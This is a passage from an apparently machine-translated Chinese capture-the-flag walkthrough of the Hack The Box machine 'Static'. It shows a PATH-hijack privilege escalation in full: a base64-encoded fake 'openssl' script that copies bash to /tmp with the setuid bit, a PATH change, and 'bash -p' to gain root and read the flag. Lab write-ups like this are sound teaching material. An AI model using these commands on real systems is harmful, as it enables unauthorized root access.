CERTIFICATE-----<br/>MIIDRzCCAi+gAwIBAgIUR+mYrXHJORV4tbg81sQS7RfjYK4wDQYJKoZIhvcNAQEL<br/>BQAwFDESMBAGA1UEAwwJc3RhdGljLWd3MCAXDTIwMDMyMjEwMTYwMVoYDzIxMjAw<br/>&lt;SNIP&gt;<br/>2aafeb626aadb6abc35fa023426c9334<br/>ea5f5af8329f367f112599f3e668bd7a<br/>-----END OpenVPN Static key V1-----<br/>&lt;/tls-auth&gt;<br/>create-&gt;CN=<br/># exit</span></pre><p id="4fb0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">输出很长，从中可以看到生成了各种密钥和文件。如果我们切换回pki框上的另一个会话，我们会在pspy64中看到一些有趣的东西:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="lp lq di lr bf ls"><div class="gh gi oc"><img src="../Images/883f787aeca1faee452e12d6fc9f6a9c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*oWJVy7Rl5Xu1MvDaDf_96g.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">Pspy64输出</figcaption></figure><h1 id="4bc5" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">路径开发</h1><p id="3357" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">执行的一些命令没有获得二进制文件的完整路径。从上面我们可以看到mktemp、openssl和mv都被直接调用，这意味着环境变量中的路径被用来查找它们。这是一个众所周知的升级路径，这里有一个很好的解释<a class="ae nl" href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/" rel="noopener ugc nofollow" target="_blank"/>，我在另一个名为<a class="ae nl" href="https://www.hackthebox.com/home/machines/profile/373" rel="noopener ugc nofollow" target="_blank">预览</a>的框中使用了一个。</p><p id="529f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">首先，我们在/tmp文件夹中创建一个文件，该文件的名称是我们看到的一个命令的名称，但没有指定路径，我对这个命令使用的是openssl。pki盒子上没有文本编辑器，所以让我们在Kali上完成它，然后我们可以将base64复制到盒子上:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="53e0" class="mx km iq mt b gy my mz l na nb">┌──(root💀kali)-[~/htb/static]<br/>└─# echo "#\!/bin/bash                                                                                           <br/>/bin/cp /bin/bash /tmp/bash<br/>chmod u+s /tmp/bash" | base64          <br/>IyEvYmluL2Jhc2gKL2Jpbi9jcCAvYmluL2Jhc2ggL3RtcC9iYXNoCmNobW9kIHUrcyAvdG1wL2Jhc2gK</span></pre><p id="8ebe" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在将它粘贴到box上，解码回多行bash脚本，并输出到一个名为openssl的文件:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="04f8" class="mx km iq mt b gy my mz l na nb">www-data@pki:/tmp$ echo "IyEvYmluL2Jhc2gKL2Jpbi9jcCAvYmluL2Jhc2ggL3RtcC9iYXNoCmNobW9kIHUrcyAvdG1wL2Jhc2gK" | base64 -d &gt; openssl<br/>www-data@pki:/tmp$ ls -lsa<br/>ls -lsa<br/>   4 -rwxr-xr-x 1 www-data www-data      60 Nov  6 19:40 openssl</span></pre><p id="9915" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">将我们的/tmp路径添加到环境$PATH变量的开头:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="3692" class="mx km iq mt b gy my mz l na nb">www-data@pki:/tmp$ export PATH=/tmp:$PATH<br/>www-data@pki:/tmp$ echo $PATH  <br/>/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span></pre><h1 id="d00d" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">根标志</h1><p id="0efa" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">回到另一个环节，与代用工具互动。然后当它试图使用openssl时，它将使用我们的版本，因为/tmp在实际文件所在的/usr/bin之前的路径列表中。</p><p id="8971" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">检查/tmp文件夹，查看bash已被复制到其中，并且sticky位已被设置:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="d4f2" class="mx km iq mt b gy my mz l na nb">www-data@pki:/tmp$ ls -lsa<br/>ls -lsa<br/>   4 -rwxr-xr-x 1 www-data www-data      40 Nov  6 19:33 openssl<br/>1088 -rws------ 1 root     www-data 1113504 Nov  6 19:38 bash</span></pre><p id="22ac" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最后，我们可以升级到root并获取标志:</p><pre class="lk ll lm ln gt ms mt mu mv aw mw bi"><span id="e582" class="mx km iq mt b gy my mz l na nb">www-data@pki:/tmp$ bash -p<br/>id<br/>uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)<br/>cat /root/root.txt<br/>&lt;HIDDEN&gt;</span></pre><p id="896d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">那是一个又长又难的盒子，但很有趣，我学到了一些非常值得的东西。我希望你也喜欢。下次见。</p></div><div class="ab cl od oe hu of" role="separator"><span class="og bw bk oh oi oj"/><span class="og bw bk oh oi oj"/><span class="og bw bk oh oi"/></div><div class="ij ik il im in"><p id="c457" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你喜欢这篇文章，请给我一两个掌声。</p><p id="a596" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">推特—【https://twitter.com/pencer_io】T4<br/>网站— <a class="ae nl" href="https://pencer.io/" rel="noopener ugc nofollow" target="_blank"> https://pencer.io </a></p><p id="539c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="ok">原载于2021年12月19日</em><a class="ae nl" href="https://pencer.io/ctf/ctf-htb-static/" rel="noopener ugc nofollow" target="_blank"><em class="ok">https://pencer . io</em></a><em class="ok">。</em></p></div></div>    
</body>
</html>